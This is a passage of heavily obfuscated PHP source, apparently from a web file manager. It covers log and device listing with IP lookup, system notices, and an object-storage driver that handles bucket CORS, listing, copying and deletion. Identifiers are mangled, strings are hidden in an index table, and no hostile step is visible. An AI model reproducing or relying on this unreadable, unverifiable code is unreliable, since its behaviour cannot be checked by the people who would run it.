$¬Ä‰Ëó¦[$ÈšÜÃŞÎ[363]]); } $¬Ä‰Ëó¦[$ÈšÜÃŞÎ[366]] = $this->logList($¬Ä‰Ëó¦[$ÈšÜÃŞÎ[366]]); return $¬Ä‰Ëó¦; } private function ipAddress(&$ö’ÚÄ) { $‹’É¦– =& $_SERVER[ê‘³Æ±]; if (!empty($ö’ÚÄ[$‹’É¦–[2213]])) { $ûÇ¯ßš¼ = IpLocation::get($ö’ÚÄ[$‹’É¦–[2213]]); } else { $ûÇ¯ßš¼ = LNG($‹’É¦–[2216]); } $ö’ÚÄ[$‹’É¦–[2217]] = $ûÇ¯ßš¼; } private function descZipDownload($ÉÔÆøÑ, &$å‡®Î­á) { $œíş« =& $_SERVER[ê‘³Æ±]; if (!isset($ÉÔÆøÑ[$œíş«[2218]])) { return; } $ ÅææóÑ = json_decode($ÉÔÆøÑ[$œíş«[2218]], !0); foreach ($ ÅææóÑ as $ŞĞƒüÊ˜) { try { $ì¡®åØ = IO::infoFull($ŞĞƒüÊ˜[$œíş«[78]]); } catch (Exception $­ŸÅ¢âı) { continue; } $ÉÔÆøÑ[$œíş«[78]] = $ŞĞƒüÊ˜[$œíş«[78]]; $å‡®Î­á[] = $ÉÔÆøÑ[$œíş«[396]] = $ì¡®åØ[$œíş«[396]]; $å‡®Î­á[] = $ÉÔÆøÑ[$œíş«[2027]] = $ì¡®åØ[$œíş«[491]]; break; } return $ÉÔÆøÑ; } private function getSourceList(&$×†Ú÷) { $á†¶„Óô =& $_SERVER[ê‘³Æ±]; $Ôã’ºûù = array(); foreach ($×†Ú÷ as $¥—Ê²ò‡ => $¿šÏÊëÅ) { $§—ÀÆ = json_decode($¿šÏÊëÅ[$á†¶„Óô[444]], !0); if ($¿šÏÊëÅ[$á†¶„Óô[33]] == $á†¶„Óô[1783]) { $§—ÀÆ = $this->descZipDownload($§—ÀÆ, $Ôã’ºûù); $×†Ú÷[$¥—Ê²ò‡][$á†¶„Óô[444]] = json_encode($§—ÀÆ); continue; } if (strpos($¿šÏÊëÅ[$á†¶„Óô[33]], $á†¶„Óô[2029]) !== 0) { if (!isset($§—ÀÆ[$á†¶„Óô[78]]) || strpos($¿šÏÊëÅ[$á†¶„Óô[33]], $á†¶„Óô[2219]) !== 0) { continue; } try { $ƒÚµ€ÖÎ = IO::infoFull($§—ÀÆ[$á†¶„Óô[78]]); } catch (Exception $µ’Û³¸Š) { continue; } $Ôã’ºûù[] = $§—ÀÆ[$á†¶„Óô[396]] = $ƒÚµ€ÖÎ[$á†¶„Óô[396]]; $Ôã’ºûù[] = $§—ÀÆ[$á†¶„Óô[2027]] = $ƒÚµ€ÖÎ[$á†¶„Óô[491]]; $×†Ú÷[$¥—Ê²ò‡][$á†¶„Óô[444]] = json_encode($§—ÀÆ); continue; } $Ôã’ºûù[] = $§—ÀÆ[$á†¶„Óô[396]]; $Ôã’ºûù[] = $§—ÀÆ[$á†¶„Óô[2027]]; if ($§—ÀÆ[$á†¶„Óô[33]] == $á†¶„Óô[547]) { $Ôã’ºûù[] = $§—ÀÆ[$á†¶„Óô[444]][$á†¶„Óô[1147]]; $Ôã’ºûù[] = $§—ÀÆ[$á†¶„Óô[444]][$á†¶„Óô[1148]]; } if ($§—ÀÆ[$á†¶„Óô[33]] == $á†¶„Óô[2036]) { $Ôã’ºûù[] = $§—ÀÆ[$á†¶„Óô[444]][$á†¶„Óô[396]]; } } if (!$Ôã’ºûù) { return array(); } return Model($á†¶„Óô[819])->sourceListInfo($Ôã’ºûù, !0); } private function logList($‚‹—ş¼°) { $™éóÏÄ =& $_SERVER[ê‘³Æ±]; $Í›Ïî˜Í = array_to_keyvalue($‚‹—ş¼°, $™éóÏÄ[12], $™éóÏÄ[1641]); $ÓĞ××å = Model($™éóÏÄ[534])->userListInfo(array_unique($Í›Ïî˜Í)); $¦‹Ï’¥ = $this->getSourceList($‚‹—ş¼°); $Ïùò±å = $this->typeAll(); $»Âš¼‘ä = array(); $¶¬”ûôò = array(); foreach ($‚‹—ş¼° as $—üµ—Â => $Ë‘¾Ñé) { $Äœåı› = $Ë‘¾Ñé[$™éóÏÄ[33]]; $Æˆã‡ËÜ = isset($ÓĞ××å[$Ë‘¾Ñé[$™éóÏÄ[1641]]]) ? $ÓĞ××å[$Ë‘¾Ñé[$™éóÏÄ[1641]]] : !1; $˜õÉÒõŸ = strpos($Äœåı›, $™éóÏÄ[2220]) === 0 ? LNG($™éóÏÄ[2221]) : LNG($™éóÏÄ[2216]); $Ë‘¾Ñé[$™éóÏÄ[32]] = isset($Æˆã‡ËÜ[$™éóÏÄ[32]]) ? $Æˆã‡ËÜ[$™éóÏÄ[32]] : LNG($™éóÏÄ[2216]); $Ë‘¾Ñé[$™éóÏÄ[531]] = isset($Æˆã‡ËÜ[$™éóÏÄ[531]]) ? $Æˆã‡ËÜ[$™éóÏÄ[531]] : $™éóÏÄ[12]; $Ë‘¾Ñé[$™éóÏÄ[1541]] = isset($Ïùò±å[$Äœåı›]) ? $Ïùò±å[$Äœåı›] : $˜õÉÒõŸ; $Ë‘¾Ñé[$™éóÏÄ[1972]] = $Æˆã‡ËÜ; $”ÍÍêè = json_decode($Ë‘¾Ñé[$™éóÏÄ[444]], !0); $Ë‘¾Ñé[$™éóÏÄ[2213]] = isset($”ÍÍêè[$™éóÏÄ[2213]]) ? $”ÍÍêè[$™éóÏÄ[2213]] : $™éóÏÄ[12]; $Ë‘¾Ñé[$™éóÏÄ[2217]] = IpLocation::get($Ë‘¾Ñé[$™éóÏÄ[2213]]); if (strpos($Äœåı›, $™éóÏÄ[2029]) === 0 || isset($”ÍÍêè[$™éóÏÄ[2027]])) { $”ÍÍêè[$™éóÏÄ[87]] = $¦‹Ï’¥[$”ÍÍêè[$™éóÏÄ[396]]]; $”ÍÍêè[$™éóÏÄ[2041]] = $¦‹Ï’¥[$”ÍÍêè[$™éóÏÄ[2027]]]; if ($”ÍÍêè[$™éóÏÄ[33]] == $™éóÏÄ[547]) { $”ÍÍêè[$™éóÏÄ[444]][$™éóÏÄ[1147]] = $¦‹Ï’¥[$”ÍÍêè[$™éóÏÄ[444]][$™éóÏÄ[1147]]]; $”ÍÍêè[$™éóÏÄ[444]][$™éóÏÄ[1148]] = $¦‹Ï’¥[$”ÍÍêè[$™éóÏÄ[444]][$™éóÏÄ[1148]]]; } if ($”ÍÍêè[$™éóÏÄ[33]] == $™éóÏÄ[2036]) { $”ÍÍêè[$™éóÏÄ[444]][$™éóÏÄ[396]] = $¦‹Ï’¥[$”ÍÍêè[$™éóÏÄ[444]][$™éóÏÄ[396]]]; } if ($”ÍÍêè[$™éóÏÄ[33]] == $™éóÏÄ[1778]) { $”ÍÍêè[$™éóÏÄ[2041]] = $”ÍÍêè[$™éóÏÄ[87]]; $”ÍÍêè[$™éóÏÄ[2027]] = $”ÍÍêè[$™éóÏÄ[2041]][$™éóÏÄ[396]]; $”ÍÍêè[$™éóÏÄ[87]] = !1; $”ÍÍêè[$™éóÏÄ[396]] = $™éóÏÄ[12]; } if ($”ÍÍêè[$™éóÏÄ[87]] && $”ÍÍêè[$™éóÏÄ[87]][$™éóÏÄ[405]] == $™éóÏÄ[1263]) { $¶¬”ûôò[] = $Ë‘¾Ñé[$™éóÏÄ[394]]; unset($‚‹—ş¼°[$—üµ—Â]); continue; } if ($”ÍÍêè[$™éóÏÄ[2041]] && $”ÍÍêè[$™éóÏÄ[2041]][$™éóÏÄ[405]] == $™éóÏÄ[1263]) { $¶¬”ûôò[] = $Ë‘¾Ñé[$™éóÏÄ[394]]; unset($‚‹—ş¼°[$—üµ—Â]); continue; } } $Ë‘¾Ñé[$™éóÏÄ[444]] = $”ÍÍêè; unset($Ë‘¾Ñé[$™éóÏÄ[2222]]); $»Âš¼‘ä[] = $Ë‘¾Ñé; } $this->clearSystemPathLog($¶¬”ûôò); return $»Âš¼‘ä; } private function clearSystemPathLog($Šô¬ö¹½) { $ÌÁóİÕø =& $_SERVER[ê‘³Æ±]; if (count($Šô¬ö¹½) == 0) { return; } $§ëÑûÑ = array($ÌÁóİÕø[394] => array($ÌÁóİÕø[7], array_unique($Šô¬ö¹½))); $this->where($§ëÑûÑ)->delete(); } public function deviceList($”“‘òÕ•, $„˜²§ö = 0) { $—ûæÆ€ =& $_SERVER[ê‘³Æ±]; $ÁÀÈ¶…ß = array($—ûæÆ€[1641] => $”“‘òÕ•, $—ûæÆ€[195] => array($—ûæÆ€[1003], $„˜²§ö), $—ûæÆ€[33] => $—ûæÆ€[1752]); $Ò—‘™Äº = array(); $¸¸ÕÅšğ = $this->field($—ûæÆ€[2223])->where($ÁÀÈ¶…ß)->order($—ûæÆ€[2039])->limit(50)->select(); foreach ($¸¸ÕÅšğ as $ÉóîÉ”ş => $˜ı´·ìŸ) { if ($ÉóîÉ”ş > 0 && abs($˜ı´·ìŸ[$—ûæÆ€[195]] - $¸¸ÕÅšğ[$ÉóîÉ”ş - 1][$—ûæÆ€[195]]) < 5) { continue; } $´Ñ…Íˆ‡ = json_decode($˜ı´·ìŸ[$—ûæÆ€[444]], !0); $˜ı´·ìŸ[$—ûæÆ€[2213]] = isset($´Ñ…Íˆ‡[$—ûæÆ€[2213]]) ? $´Ñ…Íˆ‡[$—ûæÆ€[2213]] : $—ûæÆ€[12]; unset($´Ñ…Íˆ‡[$—ûæÆ€[2213]]); $¥Õ¬×Ë = $this->deviceType($´Ñ…Íˆ‡[$—ûæÆ€[2030]]); if (isset($Ò—‘™Äº[$¥Õ¬×Ë])) { continue; } $˜ı´·ìŸ[$—ûæÆ€[2217]] = IpLocation::get($˜ı´·ìŸ[$—ûæÆ€[2213]]); $˜ı´·ìŸ[$—ûæÆ€[444]] = $´Ñ…Íˆ‡; $Ò—‘™Äº[$¥Õ¬×Ë] = $˜ı´·ìŸ; } return array_values($Ò—‘™Äº); } public function deviceType($ÙœİË·Ü) { return $ÙœİË·Ü; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\x65\x6d\x2e\156\x6f\164\x69\143\145\114\151\x73\x74"; public $field = array("\x6e\141\x6d\145", "\143\x6f\x6e\x74\x65\x6e\164", "\141\x75\164\x68", "\x6d\157\x64\145", "\x74\x69\155\x65", "\164\x79\160\x65", "\x6c\x65\x76\145\x6c", "\x65\156\x61\142\x6c\x65", "\x73\157\162\164"); public function listData($öåà­Ó = false, $ĞªŒı§± = "\x73\157\x72\164", $¦‚˜¤›ì = false) { return parent::listData($öåà­Ó, $ĞªŒı§±, $¦‚˜¤›ì); } public function add($—ª„ï±) { $¸ÏÔÄí± =& $_SERVER[ê‘³Æ±]; $®ª€ = time(); if ($—ª„ï±[$¸ÏÔÄí±[16]] == $¸ÏÔÄí±[2224]) { $®ª€ = strtotime($—ª„ï±[$¸ÏÔÄí±[198]]); } $—ª„ï±[$¸ÏÔÄí±[198]] = $®ª€; return parent::insert($—ª„ï±); } public function update($­ò’Âßñ, $“·â–ì) { $Ñ¶Ç³« =& $_SERVER[ê‘³Æ±]; $å¬äå£ù = $this->listData($­ò’Âßñ); if (!$å¬äå£ù) { return !1; } $†ÏŠ›Íã = time(); if ($“·â–ì[$Ñ¶Ç³«[16]] == $Ñ¶Ç³«[2224]) { $†ÏŠ›Íã = strtotime($“·â–ì[$Ñ¶Ç³«[198]]); } $“·â–ì[$Ñ¶Ç³«[198]] = $†ÏŠ›Íã; return parent::update($­ò’Âßñ, $“·â–ì); } public function remove($ëƒÁï´) { $îˆ÷¼Ì† = $this->listData($ëƒÁï´); if (!$îˆ÷¼Ì† || $îˆ÷¼Ì†[$_SERVER[ê‘³Æ±][1263]]) { return !1; } return parent::remove($ëƒÁï´); } public function sort($²õÓ•Ì, $¡ßØŞûÅ) { return parent::update($²õÓ•Ì, $¡ßØŞûÅ); } public function enable($âƒ‚Èƒ», $ò†“•Å•) { return parent::update($âƒ‚Èƒ», array($_SERVER[ê‘³Æ±][2225] => $ò†“•Å•)); } private function initUserOption() { $ß½¥ÕèË =& $_SERVER[ê‘³Æ±]; $this->optionType = $ß½¥ÕèË[2226]; $this->modelType = $ß½¥ÕèË[2227]; $this->field = array($ß½¥ÕèË[2228], $ß½¥ÕèË[32], $ß½¥ÕèË[198], $ß½¥ÕèË[33], $ß½¥ÕèË[2229], $ß½¥ÕèË[736], $ß½¥ÕèË[190]); } public function userNoticeGet($Óéºî = false) { $this->initUserOption(); return parent::listData($Óéºî, $_SERVER[ê‘³Æ±][394], !0); } public function userNoticeAdd($À¾¬‘) { $üí…î”ö =& $_SERVER[ê‘³Æ±]; $this->initUserOption(); $Ÿ¢øÓ¶ö = $this->findByKey($üí…î”ö[2228], $À¾¬‘[$üí…î”ö[394]]); if ($Ÿ¢øÓ¶ö) { return !0; } $­Õï»È = array($üí…î”ö[2228] => $À¾¬‘[$üí…î”ö[394]], $üí…î”ö[32] => $À¾¬‘[$üí…î”ö[32]], $üí…î”ö[198] => $À¾¬‘[$üí…î”ö[198]], $üí…î”ö[33] => isset($À¾¬‘[$üí…î”ö[33]]) ? $À¾¬‘[$üí…î”ö[33]] : 1, $üí…î”ö[2229] => isset($À¾¬‘[$üí…î”ö[2229]]) ? $À¾¬‘[$üí…î”ö[2229]] : 0, $üí…î”ö[736] => 0, $üí…î”ö[190] => 0); return parent::insert($­Õï»È); } public function userNoticeEdit($‹ççÈëø, $ûù¸Õï½) { $this->initUserOption(); return parent::update($‹ççÈëø, $ûù¸Õï½); } } goto FËòÚ¥ËŠ; a”½Ó÷œ§•: class PathDriverOOS extends PathDriverBaseS3 { public function __construct($ÈÕã”æù) { parent::__construct($ÈÕã”æù); $this->signatureVersion($_SERVER[ê‘³Æ±][213]); } public function fileOutLink($¿­¾“ß) { $Á‘Â›Ç =& $_SERVER[ê‘³Æ±]; if (substr($¿­¾“ß, 0, 7) == $Á‘Â›Ç[1312]) { $¿­¾“ß = $Á‘Â›Ç[1313] . substr($¿­¾“ß, 7); } header($Á‘Â›Ç[160] . $¿­¾“ß); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public function __construct($Äú­ÑÅ) { parent::__construct(); include_once SDK_DIR . $_SERVER[ê‘³Æ±][1369]; $this->_init($Äú­ÑÅ); } public function _init($Éˆü–„¾) { $…Ÿøß½— =& $_SERVER[ê‘³Æ±]; foreach ($Éˆü–„¾ as $şÇı‹ªŒ => $¥ÈÌ) { if (isset($this->{$şÇı‹ªŒ})) { $this->{$şÇı‹ªŒ} = $¥ÈÌ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($…Ÿøß½—[1370] . LNG($…Ÿøß½—[1371])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $Åå¸÷†ã =& $_SERVER[ê‘³Æ±]; $›áŒĞ‡ = new OSS\Model\CorsConfig(); $÷ôş¿ÛŞ = new OSS\Model\CorsRule(); $÷ôş¿ÛŞ->addAllowedOrigin($Åå¸÷†ã[1372]); $÷ôş¿ÛŞ->addAllowedMethod($Åå¸÷†ã[1373]); $÷ôş¿ÛŞ->addAllowedMethod($Åå¸÷†ã[1374]); $÷ôş¿ÛŞ->addAllowedMethod($Åå¸÷†ã[1375]); $÷ôş¿ÛŞ->addAllowedMethod($Åå¸÷†ã[1376]); $÷ôş¿ÛŞ->addAllowedMethod($Åå¸÷†ã[159]); $÷ôş¿ÛŞ->setMaxAgeSeconds(600); $÷ôş¿ÛŞ->addExposeHeader($Åå¸÷†ã[1377]); $÷ôş¿ÛŞ->addAllowedHeader($Åå¸÷†ã[1372]); $›áŒĞ‡->addRule($÷ôş¿ÛŞ); try { $this->client->putBucketCors($this->bucket, $›áŒĞ‡); } catch (OSS\Core\OssException $Öô…Îìû) { return !1; } return !0; } public function getBucketCors() { $±Ê”Ÿì¬ =& $_SERVER[ê‘³Æ±]; $úÜ¬²É³ = null; try { $úÜ¬²É³ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $‹™ç©®Ğ) { return null; } if (!$úÜ¬²É³ || !($Ó“Å…¬ = $úÜ¬²É³->getRules())) { return null; } $Íã®İÆ = $Ó“Å…¬[0]->getAllowedOrigins(); $ÆüŸßš£ = $Ó“Å…¬[0]->getAllowedMethods(); $‹õê»Øµ = $Ó“Å…¬[0]->getMaxAgeSeconds(); $ğÒÈÀçæ = $Ó“Å…¬[0]->getExposeHeaders(); $”üÚ„»— = $Ó“Å…¬[0]->getAllowedHeaders(); return array($±Ê”Ÿì¬[182] => isset($Íã®İÆ[0]) ? $Íã®İÆ[0] : $±Ê”Ÿì¬[12], $±Ê”Ÿì¬[186] => $ÆüŸßš£, $±Ê”Ÿì¬[1378] => $‹õê»Øµ, $±Ê”Ÿì¬[1379] => isset($ğÒÈÀçæ[0]) ? $ğÒÈÀçæ[0] : $±Ê”Ÿì¬[12], $±Ê”Ÿì¬[184] => isset($”üÚ„»—[0]) ? $”üÚ„»—[0] : $±Ê”Ÿì¬[12]); } public function isBucketCors() { $Ô²Îƒ—İ =& $_SERVER[ê‘³Æ±]; $ïí‰èØé = $this->getBucketCors(); if (!$ïí‰èØé || !is_array($ïí‰èØé)) { return !1; } if ($ïí‰èØé[$Ô²Îƒ—İ[182]] != $Ô²Îƒ—İ[183] || $ïí‰èØé[$Ô²Îƒ—İ[184]] != $Ô²Îƒ—İ[183]) { return !1; } $Ú©µÊ…É = array_map($Ô²Îƒ—İ[185], $ïí‰èØé[$Ô²Îƒ—İ[186]]); if (!is_array($Ú©µÊ…É)) { $Ú©µÊ…É = array(); } $ºí…Š… = array($Ô²Îƒ—İ[187], $Ô²Îƒ—İ[188], $Ô²Îƒ—İ[189], $Ô²Îƒ—İ[190], $Ô²Îƒ—İ[191]); $ñ®Ş‡¥ê = array_diff($ºí…Š…, $Ú©µÊ…É); return empty($ñ®Ş‡¥ê); } public function mkfile($ ‘Èø…, $…ŒµÍ¿ = '', $áêôû«¨ = REPEAT_RENAME) { $…Ï–ÈËš = $this->setContent($ ‘Èø…, $…ŒµÍ¿); if ($…Ï–ÈËš !== !1) { return $this->getPathOuter($ ‘Èø…); } return !1; } public function mkdir($Œ˜àåè, $ÚÅí‘›É = REPEAT_SKIP) { if ($this->_isFolder($Œ˜àåè)) { return $this->getPathOuter($Œ˜àåè); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($Œ˜àåè)); } catch (OSS\Core\OssException $ëüÊàà²) { return !1; } return $this->getPathOuter($Œ˜àåè); } private function fileList($Ìë–±‡, $Û€å˜… = '', $§µÆ«òÓ = 0) { $ƒÎïÌÒÔ =& $_SERVER[ê‘³Æ±]; $Ìë–±‡ = trim($Ìë–±‡, $ƒÎïÌÒÔ[8]); $ş¿¡•ññ = empty($Ìë–±‡) && $Ìë–±‡ !== $ƒÎïÌÒÔ[192] ? $ƒÎïÌÒÔ[12] : $Ìë–±‡ . $ƒÎïÌÒÔ[8]; $ÙäÏâ´ = $ƒÎïÌÒÔ[12]; $ØåıĞÁá = 1000; $©İå©ª = $this->listItemCache === !1 ? !1 : !0; $Œ¢ÌÛÖ´ = $«Õ¸«›å = array(); while (!0) { check_abort(); $œ×ôû®Ç = array($ƒÎïÌÒÔ[1380] => $Û€å˜…, $ƒÎïÌÒÔ[1381] => $ş¿¡•ññ, $ƒÎïÌÒÔ[1382] => $ØåıĞÁá, $ƒÎïÌÒÔ[1383] => $ÙäÏâ´); try { $òãÊâÍ = $this->client->listObjects($this->bucket, $œ×ôû®Ç); } catch (OSS\Core\OssException $€°”‘á) { break; } $ÙäÏâ´ = $òãÊâÍ->getNextMarker(); $°¶’¨¹È = $òãÊâÍ->getObjectList(); $®ˆ¡²Â® = $òãÊâÍ->getPrefixList(); foreach ($°¶’¨¹È as $€öµÓ‰Ê) { if ($€öµÓ‰Ê->getKey() == $ş¿¡•ññ) { continue; } $š–íü› = $€öµÓ‰Ê->getKey(); $”Ò×£œ‹ = $€öµÓ‰Ê->getSize(); $ƒ€ìŞ±ø = $€öµÓ‰Ê->getLastModified(); $áÜ»Æ¼» = $§µÆ«òÓ ? array($ƒÎïÌÒÔ[32] => $š–íü›, $ƒÎïÌÒÔ[80] => $”Ò×£œ‹, $ƒÎïÌÒÔ[198] => strtotime($ƒ€ìŞ±ø)) : $š–íü›; $¥×ÎÄ™ = $”Ò×£œ‹ == 0 && substr($š–íü›, strlen($š–íü›) - 1, 1) == $ƒÎïÌÒÔ[8] ? !0 : !1; if ($©İå©ª) { $this->cacheMethod($ƒÎïÌÒÔ[200], $š–íü›, $¥×ÎÄ™); $this->cacheMethod($ƒÎïÌÒÔ[201], $š–íü›, array($ƒÎïÌÒÔ[80] => $”Ò×£œ‹, $ƒÎïÌÒÔ[1384] => $”Ò×£œ‹, $ƒÎïÌÒÔ[86] => strtotime($ƒ€ìŞ±ø), $ƒÎïÌÒÔ[1385] => $ƒ€ìŞ±ø)); } if ($¥×ÎÄ™) { $Œ¢ÌÛÖ´[] = $š–íü›; continue; } $«Õ¸«›å[] = $áÜ»Æ¼»; } foreach ($®ˆ¡²Â® as $ĞÄÇ¬¯ú) { $Œ¢ÌÛÖ´[] = $ĞÄÇ¬¯ú->getPrefix(); if ($©İå©ª) { $this->cacheMethod($ƒÎïÌÒÔ[200], $š–íü›, !0); } } if ($ÙäÏâ´ === $ƒÎïÌÒÔ[12]) { break; } } if ($©İå©ª) { $this->cacheMethod($ƒÎïÌÒÔ[200], $Ìë–±‡, !0); } return array($ƒÎïÌÒÔ[77] => $Œ¢ÌÛÖ´, $ƒÎïÌÒÔ[76] => $«Õ¸«›å); } public function copyFile($äÒ¼ğ°Ö, $°ñ‡ùé²) { $µ”ÚÄøÛ = $this->size($äÒ¼ğ°Ö); if ($µ”ÚÄøÛ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $äÒ¼ğ°Ö, $this->bucket, $this->pathEncode($°ñ‡ùé²)); } catch (OSS\Core\OssException $Ø§Å™­) { return !1; } return $this->getPathOuter($°ñ‡ùé²); } $ŸºŸŒŞØ = $this->multiCopyObject($äÒ¼ğ°Ö, $°ñ‡ùé², $µ”ÚÄøÛ); return $ŸºŸŒŞØ ? $this->getPathOuter($°ñ‡ùé²) : !1; } private function multiCopyObject($ß¶ñ¿İ—, $’­Û‰ØÍ, $±¡ã‰) { $ï°Šæ÷ =& $_SERVER[ê‘³Æ±]; try { $–àôÛ¦  = array(); if ($éàÛÔ… = $this->hashMd5($ß¶ñ¿İ—)) { $–àôÛ¦  = array(OSS\OssClient::OSS_HEADERS => array($ï°Šæ÷[1386] => $éàÛÔ…)); } $Õ–¶ÅÏ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($’­Û‰ØÍ), $–àôÛ¦ ); $Í«ÄÛä¢ = 1; $ËŸÇœÁö = 0; $‘™ËÑœ– = array(); $Šñ €Í° = 1024 * 1024 * 10; $›Ãæí¹ = $this->client->generateMultiuploadParts($±¡ã‰, $Šñ €Í°); foreach ($›Ãæí¹ as $¤é’ªíÚ => $À¾™†ï) { $ö™ÃÌÄí = $ËŸÇœÁö + (int) $À¾™†ï[$ï°Šæ÷[1387]]; $×ÕÜÊÏÖ = (int) $À¾™†ï[$ï°Šæ÷[334]] + $ö™ÃÌÄí - 1; $»ìøçÅ = array($ï°Šæ÷[1388] => $ö™ÃÌÄí, $ï°Šæ÷[1389] => $×ÕÜÊÏÖ); $‘™ËÑœ–[] = $this->client->uploadPartCopy($this->bucket, $ß¶ñ¿İ—, $this->bucket, $this->pathEncode($’­Û‰ØÍ), $Í«ÄÛä¢, $Õ–¶ÅÏ, $»ìøçÅ); $Í«ÄÛä¢ = $Í«ÄÛä¢ + 1; } $©í³¸è´ = array(); foreach ($‘™ËÑœ– as $¤é’ªíÚ => $†¨€®”è) { $©í³¸è´[] = array($ï°Šæ÷[1390] => $¤é’ªíÚ + 1, $ï°Šæ÷[1391] => $†¨€®”è); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($’­Û‰ØÍ), $Õ–¶ÅÏ, $©í³¸è´); } catch (OSS\Core\OssException $Æ–É¶Ì²) { return !1; } return !0; } public function moveFile($ƒóöªØç, $ûËöĞ·) { if ($this->copyFile($ƒóöªØç, $ûËöĞ·)) { $this->remove($ƒóöªØç); return $this->getPathOuter($ûËöĞ·); } return !1; } public function delFile($‘ó™İ¼) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($‘ó™İ¼)); } catch (OSS\Core\OssException $ÒéıÕ¢ˆ) { return !1; } return !0; } public function delFolder($Õ¡¹”ÄÆ) { $ê¤è‘®‘ =& $_SERVER[ê‘³Æ±]; if (!$this->exist($Õ¡¹”ÄÆ)) { return !0; } $this->listItemCache = !1; $­Ïƒâ¹ã = $this->fileList($Õ¡¹”ÄÆ); $this->listItemCache = !0; $ÍÍâÅÃ¦ = trim($Õ¡¹”ÄÆ, $ê¤è‘®‘[8]) . $ê¤è‘®‘[8]; if (!empty($Õ¡¹”ÄÆ) && $Õ¡¹”ÄÆ !== $ê¤è‘®‘[192] && !in_array($ÍÍâÅÃ¦, $­Ïƒâ¹ã[$ê¤è‘®‘[77]])) { $­Ïƒâ¹ã[$ê¤è‘®‘[77]][] = $ÍÍâÅÃ¦; } $æşÖÊ’¥ = $this->delByBatch($­Ïƒâ¹ã[$ê¤è‘®‘[76]]); if (!$æşÖÊ’¥) { return !1; } $æşÖÊ’¥ = $this->delByBatch($­Ïƒâ¹ã[$ê¤è‘®‘[77]]); if (!$æşÖÊ’¥) { return !1; } return $this->delFile($ÍÍâÅÃ¦); } private function delByBatch($¥—ñë) { foreach (array_chunk($¥—ñë, 1000) as $¢²¶­ßÀ) { try { $this->client->deleteObjects($this->bucket, $¢²¶­ßÀ); } catch (OSS\Core\OssException $óÀŠé¹) { return !1; } } return !0; } public function rename($‰ã³à, $¹ª§ªªâ) { return $this->renameObject($‰ã³à, $¹ª§ªªâ); } private function fileInfo($éš©¤¶Ê, $ö¡Ù•Ëä = false, $Õ±×ëß = array()) { $…ÊØö¬ü =& $_SERVER[ê‘³Æ±]; $õ§É´¯Ş = array($…ÊØö¬ü[32] => $this->pathThis($éš©¤¶Ê), $…ÊØö¬ü[78] => $this->getPathOuter($éš©¤¶Ê), $…ÊØö¬ü[33] => $…ÊØö¬ü[194], $…ÊØö¬ü[80] => isset($Õ±×ëß[$…ÊØö¬ü[80]]) ? $Õ±×ëß[$…ÊØö¬ü[80]] : 0, $…ÊØö¬ü[169] => $this->ext($éš©¤¶Ê)); if ($ö¡Ù•Ëä) { return $õ§É´¯Ş; } $õ§É´¯Ş[$…ÊØö¬ü[195]] = $õ§É´¯Ş[$…ÊØö¬ü[86]] = 0; $õ§É´¯Ş[$…ÊØö¬ü[196]] = $õ§É´¯Ş[$…ÊØö¬ü[197]] = !0; if (empty($Õ±×ëß)) { $Œ÷Êæ«… = $this->objectMeta($éš©¤¶Ê); if (!$Œ÷Êæ«…) { return $õ§É´¯Ş; } $Õ±×ëß = array($…ÊØö¬ü[86] => strtotime($Œ÷Êæ«…[$…ÊØö¬ü[1385]]), $…ÊØö¬ü[80] => $Œ÷Êæ«…[$…ÊØö¬ü[1384]] + 0); } if (isset($Õ±×ëß[$…ÊØö¬ü[80]])) { $õ§É´¯Ş[$…ÊØö¬ü[80]] = $Õ±×ëß[$…ÊØö¬ü[80]]; } if (isset($Õ±×ëß[$…ÊØö¬ü[86]])) { $õ§É´¯Ş[$…ÊØö¬ü[86]] = $Õ±×ëß[$…ÊØö¬ü[86]]; } if (isset($Õ±×ëß[$…ÊØö¬ü[198]]) && !trim($õ§É´¯Ş[$…ÊØö¬ü[86]])) { $õ§É´¯Ş[$…ÊØö¬ü[86]] = $Õ±×ëß[$…ÊØö¬ü[198]]; } return $õ§É´¯Ş; } private function folderInfo($Ğ€¶‚¶Ø, $‚ñãİ¬Ô = false, $ÚÃòò = array()) { $ğíèñÒ =& $_SERVER[ê‘³Æ±]; $ı£Åù­‘ = array($ğíèñÒ[32] => $this->pathThis($Ğ€¶‚¶Ø), $ğíèñÒ[78] => $this->getPathOuter($ğíèñÒ[8] . $Ğ€¶‚¶Ø), $ğíèñÒ[33] => $ğíèñÒ[79]); if ($‚ñãİ¬Ô) { return $ı£Åù­‘; } $ı£Åù­‘[$ğíèñÒ[195]] = $ı£Åù­‘[$ğíèñÒ[86]] = 0; $ı£Åù­‘[$ğíèñÒ[196]] = $ı£Åù­‘[$ğíèñÒ[197]] = !0; if (empty($ÚÃòò)) { $Ğ€¶‚¶Ø = rtrim($Ğ€¶‚¶Ø, $ğíèñÒ[8]) . $ğíèñÒ[8]; $ÊÍ¿©İÌ = $this->objectMeta($Ğ€¶‚¶Ø); if (!$ÊÍ¿©İÌ) { return $ı£Åù­‘; } $ÚÃòò = array($ğíèñÒ[195] => $ÊÍ¿©İÌ[$ğíèñÒ[504]][$ğíèñÒ[1392]], $ğíèñÒ[86] => strtotime($ÊÍ¿©İÌ[$ğíèñÒ[1385]])); } if (isset($ÚÃòò[$ğíèñÒ[86]])) { $ı£Åù­‘[$ğíèñÒ[86]] = $ÚÃòò[$ğíèñÒ[86]]; } if (isset($ÚÃòò[$ğíèñÒ[195]])) { $ı£Åù­‘[$ğíèñÒ[195]] = $ÚÃòò[$ğíèñÒ[195]]; } return $ı£Åù­‘; } public function listPath($ËÃŞŞ£, $øß˜¡Ó¿ = false) { $Œ®“­ò =& $_SERVER[ê‘³Æ±]; $¶Ûì‡¬ = $this->fileList($ËÃŞŞ£, $Œ®“­ò[8], !0); foreach 